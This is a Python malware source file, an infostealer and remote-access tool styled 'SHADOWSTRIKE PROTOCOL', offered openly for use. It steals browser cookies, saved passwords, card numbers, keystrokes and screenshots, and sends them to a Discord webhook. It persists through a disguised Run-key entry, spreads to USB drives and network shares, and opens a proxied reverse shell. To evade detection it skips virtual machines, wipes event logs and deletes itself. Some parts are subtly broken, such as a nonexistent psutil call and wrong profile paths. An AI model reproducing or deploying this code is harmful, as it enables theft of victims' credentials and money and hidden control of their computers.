import requests
import json
import re
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import socket
import whois
import browser_cookie3
import os
import sqlite3
import shutil
import subprocess
import winreg
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from pynput import keyboard
import threading
import tempfile
import sys
import psutil
import random
import platform
import socks
import socket as sock
from PIL import ImageGrab
import io
import base64
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

# Webhook URL (replace with your Discord webhook, you ruthless fuck)
webhook_url = "YOUR_WEBHOOK_URL_HERE"

# AES-256 encryption key
key = get_random_bytes(32)

# Anti-VM detection
def is_vm():
    try:
        checks = [
            os.path.exists("C:\\Program Files\\VMware\\VMware Tools"),
            "VIRTUAL" in platform.uname().release.upper(),
            len(psutil.cpu_info()) < 2,
            psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024,  # Less than 2GB RAM
        ]
        return any(checks)
    except:
        return False

# Function to encrypt data with AES-256
def encrypt_data(data):
    try:
        cipher = AES.new(key, AES.MODE_EAX)
        data_bytes = json.dumps(data).encode()
        ciphertext, tag = cipher.encrypt_and_digest(data_bytes)
        return base64.b64encode(cipher.nonce + tag + ciphertext).decode()
    except:
        return ""

# Function to capture screenshot
def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        return base64.b64encode(buffer.getvalue()).decode()
    except:
        return ""

# Function to add to startup (Windows 10/11, max stealth)
def add_to_startup():
    try:
        script_path = os.path.abspath(__file__)
        dest_path = os.path.join(os.environ["APPDATA"], "Microsoft", "System", "svcupdate.py")
        os.makedirs(os.path.dirname(dest_path), exist_ok=True)
        shutil.copy(script_path, dest_path)
        subprocess.run(f'attrib +h +s "{dest_path}"', shell=True)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSvcUpdate", 0, winreg.REG_SZ, f'pythonw "{dest_path}"')
        winreg.CloseKey(key)
    except:
        pass

# Function to spread to USB drives and network shares
def spread_to_usb_and_shares():
    try:
        script_path = os.path.abspath(__file__)
        # USB drives
        drives = [chr(x) + ":\\" for x in range(65, 91) if os.path.exists(chr(x) + ":\\")]
        for drive in drives:
            if "Removable" in subprocess.getoutput(f"fsutil fsinfo drivetype {drive}"):
                try:
                    dest = os.path.join(drive, "svcupdate.py")
                    shutil.copy(script_path, dest)
                    subprocess.run(f'attrib +h +s "{dest}"', shell=True)
                    with open(os.path.join(drive, "autorun.inf"), "w") as f:
                        f.write("[AutoRun]\nopen=svcupdate.py\naction=SystemUpdateService")
                    subprocess.run(f'attrib +h +s "{os.path.join(drive, "autorun.inf")}"', shell=True)
                except:
                    pass
        # Network shares
        for disk in psutil.disk_partitions():
            if "net" in disk.opts.lower():
                try:
                    dest = os.path.join(disk.mountpoint, "svcupdate.py")
                    shutil.copy(script_path, dest)
                    subprocess.run(f'attrib +h +s "{dest}"', shell=True)
                except:
                    pass
    except:
        pass

# Function to clean traces
def clean_traces():
    try:
        temp_dir = tempfile.gettempdir()
        for file in os.listdir(temp_dir):
            try:
                file_path = os.path.join(temp_dir, file)
                if os.path.isfile(file_path):
                    os.remove(file_path)
            except:
                pass
        subprocess.run('wevtutil cl System', shell=True, capture_output=True)
        subprocess.run('wevtutil cl Application', shell=True, capture_output=True)
        subprocess.run('wevtutil cl Security', shell=True, capture_output=True)
        subprocess.run('reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache /f', shell=True, capture_output=True)
        subprocess.run('reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f', shell=True, capture_output=True)
    except:
        pass

# Function to self-destruct
def self_destruct():
    try:
        script_path = os.path.abspath(__file__)
        subprocess.run(f'powershell -Command "Start-Sleep -Seconds 5; Remove-Item \'{script_path}\' -Force"', shell=True, capture_output=True)
    except:
        pass

# Function to steal cookies from all browsers
def steal_cookies():
    try:
        cookies = {}
        for browser in [browser_cookie3.chrome, browser_cookie3.firefox, browser_cookie3.edge, browser_cookie3.opera, browser_cookie3.safari, browser_cookie3.brave]:
            try:
                browser_cookies = browser(domain_name='')
                cookies[browser.__name__] = [(cookie.name, cookie.value, cookie.domain) for cookie in browser_cookies]
            except:
                cookies[browser.__name__] = []
        return cookies
    except:
        return {}

# Function to steal credit card info from local files
def steal_credit_cards():
    try:
        credit_cards = []
        search_dirs = [
            os.path.expanduser("~"),
            os.path.join(os.path.expanduser("~"), "Documents"),
            os.path.join(os.path.expanduser("~"), "Downloads"),
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(os.path.expanduser("~"), "AppData", "Roaming"),
            os.path.join(os.path.expanduser("~"), "AppData", "Local")
        ]
        cc_patterns = [
            r'\b(?:\d[ -]*?){13,16}\b',
            r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',
            r'\b\d{4}[- ]?\d{6}[- ]?\d{5}\b',  # Amex
        ]
        expiry_pattern = r'\b(0[1-9]|1[0-2])/?([0-9]{2,4})\b'
        cvv_pattern = r'\b\d{3,4}\b'

        for directory in search_dirs:
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.endswith(('.txt', '.doc', '.docx', '.pdf', '.csv', '.xml', '.json', '.log')):
                        try:
                            with open(os.path.join(root, file), 'r', errors='ignore') as f:
                                content = f.read()
                                for pattern in cc_patterns:
                                    cc_numbers = re.findall(pattern, content)
                                    for cc in cc_numbers:
                                        card_info = {'card_number': cc}
                                        expiry = re.findall(expiry_pattern, content)
                                        cvv = re.findall(cvv_pattern, content)
                                        if expiry:
                                            card_info['expiry'] = expiry[0]
                                        if cvv:
                                            card_info['cvv'] = cvv[0]
                                        credit_cards.append(card_info)
                        except:
                            continue
        return credit_cards
    except:
        return []

# Function to steal stored passwords (Chrome, Edge, Windows 10/11)
def steal_passwords():
    try:
        passwords = []
        browsers = [
            (os.path.join(os.environ["APPDATA"], "Local", "Google", "Chrome", "User Data", "Default", "Login Data"), "chrome"),
            (os.path.join(os.environ["APPDATA"], "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"), "edge")
        ]
        for db_path, browser_name in browsers:
            if not os.path.exists(db_path):
                continue
            temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_logindata.enc")
            shutil.copyfile(db_path, temp_db)
            subprocess.run(f'attrib +h "{temp_db}"', shell=True)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, password = row
                passwords.append({
                    'browser': browser_name,
                    'url': url,
                    'username': username,
                    'password': password.decode('utf-8', errors='ignore')
                })
            conn.close()
            os.remove(temp_db)
        return passwords
    except:
        return []

# Function to log keystrokes (encrypted)
def log_keystrokes():
    try:
        log_file = os.path.join(tempfile.gettempdir(), "klog.enc")
        subprocess.run(f'attrib +h +s "{log_file}"', shell=True)
        def on_press(key):
            try:
                with open(log_file, 'a') as f:
                    f.write(encrypt_data(str(key)) + '\n')
            except:
                pass
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    except:
        pass

# Function to set up persistent reverse shell with port hopping and proxy
def setup_reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        ports = [random.randint(49152, 65535) for _ in range(5)]  # High ports for stealth
        proxy_list = [
            ("socks5", "YOUR_PROXY_IP1", YOUR_PROXY_PORT1),
            ("socks5", "YOUR_PROXY_IP2", YOUR_PROXY_PORT2),
            ("socks5", "YOUR_PROXY_IP3", YOUR_PROXY_PORT3)
        ]
        shell_code = f"""
import socket
import subprocess
import os
import time
import random
import socks
ports = {ports}
proxies = {proxy_list}
while True:
    for port in ports:
        try:
            proxy = random.choice(proxies)
            socks.set_default_proxy(socks.SOCKS5, proxy[1], proxy[2])
            socket.socket = socks.socksocket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect(("{local_ip}", port))
            while True:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    break
                output = subprocess.getoutput(command)
                s.send(output.encode())
            s.close()
        except:
            time.sleep(random.randint(30, 60))
"""
        shell_path = os.path.join(tempfile.gettempdir(), f"svc{random.randint(1000,9999)}.py")
        with open(shell_path, "w") as f:
            f.write(shell_code)
        subprocess.run(f'attrib +h +s "{shell_path}"', shell=True)
        subprocess.Popen(["pythonw", shell_path], creationflags=subprocess.CREATE_NO_WINDOW)
        return f"nc {local_ip} {ports[0]} (or try {', '.join(map(str, ports[1:]))})"
    except:
        return "Failed to generate connect link"

# Function to send slick Discord embed webhook
def send_to_webhook(data):
    try:
        encrypted_data = encrypt_data(data)
        embed = {
            "title": "🌌 SHADOWSTRIKE PROTOCOL 🌌",
            "description": "Target eradicated! Behold the digital carnage:",
            "color": 0x000000,  # Pitch-black cyber aesthetic
            "fields": [
                {"name": "🔗 Remote Access", "value": f"```{data.get('connect_link', 'N/A')}```", "inline": False},
                {"name": "🍪 Cookies Harvested", "value": f"Chrome: {len(data.get('cookies', {}).get('chrome', []))}, Firefox: {len(data.get('cookies', {}).get('firefox', []))}, Brave: {len(data.get('cookies', {}).get('brave', []))}, Edge: {len(data.get('cookies', {}).get('edge', []))} + more", "inline": True},
                {"name": "💳 Cards Plundered", "value": f"{len(data.get('credit_cards', []))} captured", "inline": True},
                {"name": "🔑 Credentials", "value": f"{len(data.get('passwords', []))} stolen", "inline": True},
                {"name": "📸 Snapshot", "value": "Captured (AES-256)", "inline": True},
                {"name": "🎯 Target Intel", "value": f"IP: {data.get('ip_info', {}).get('ip', 'N/A')}\nCity: {data.get('ip_info', {}).get('city', 'N/A')}\nOS: {platform.system()} {platform.release()}", "inline": False}
            ],
            "footer": {"text": "Unleashed by UltraZartrex's Phantom Forge 😈 | AES-256 Encryption"},
            "thumbnail": {"url": "https://i.imgur.com/shadowstrike.png"},  # Replace with cyberpunk skull
            "image": {"url": "attachment://snapshot.png"} if data.get('screenshot') else {}
        }
        payload = {
            "embeds": [embed],
            "content": f"🔒 Encrypted Payload: ```{encrypted_data}```",
            "username": "PhantomReaper",
            "avatar_url": "https://i.imgur.com/phantom_icon.png"  # Replace with sleek avatar
        }
        if data.get('screenshot'):
            files = {"file": ("snapshot.png", io.BytesIO(base64.b64decode(data['screenshot'])), "image/png")}
            requests.post(webhook_url, data={"payload_json": json.dumps(payload)}, files=files)
        else:
            requests.post(webhook_url, json=payload)
    except:
        pass

# Function to scrape generic webpage (stealthy)
def scrape_webpage(url="https://discord.com"):
    try:
        response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, verify=False, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        text = soup.get_text().lower()
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
        phones = re.findall(r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b', text)
        return {'emails': emails, 'phones': phones}
    except:
        return {}

# Function to get domain info
def get_domain_info(url="https://discord.com"):
    try:
        domain = urlparse(url).netloc
        whois_info = whois.whois(domain)
        return {
            'domain': domain,
            'registrar': whois_info.get('registrar'),
            'creation_date': str(whois_info.get('creation_date')),
            'expiration_date': str(whois_info.get('expiration_date'))
        }
    except:
        return {}

# Function to get IP info
def get_ip_info(url="https://discord.com"):
    try:
        domain = urlparse(url).netloc
        ip = socket.gethostbyname(domain)
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'ip': ip,
                'city': data.get('city'),
                'country': data.get('country'),
                'isp': data.get('isp')
            }
        return {}
    except:
        return {}

# Main function to gather all info
def gather_user_info():
    if is_vm():  # Skip if in VM
        return
    info = {}
    info['webpage'] = scrape_webpage()
    info['domain'] = get_domain_info()
    info['ip_info'] = get_ip_info()
    info['cookies'] = steal_cookies()
    info['credit_cards'] = steal_credit_cards()
    info['passwords'] = steal_passwords()
    info['screenshot'] = capture_screenshot()
    info['connect_link'] = setup_reverse_shell()
    
    # Save to encrypted file (hidden, random name)
    enc_file = os.path.join(tempfile.gettempdir(), f"svc{random.randint(10000,99999)}.enc")
    with open(enc_file, 'w') as f:
        f.write(encrypt_data(info))
    subprocess.run(f'attrib +h +s "{enc_file}"', shell=True)
    
    # Send to webhook
    send_to_webhook(info)
    
    # Clean traces and self-destruct
    clean_traces()
    self_destruct()

# Run silently
if __name__ == "__main__":
    add_to_startup()
    spread_to_usb_and_shares()
    threading.Thread(target=log_keystrokes, daemon=True).start()
    gather_user_info()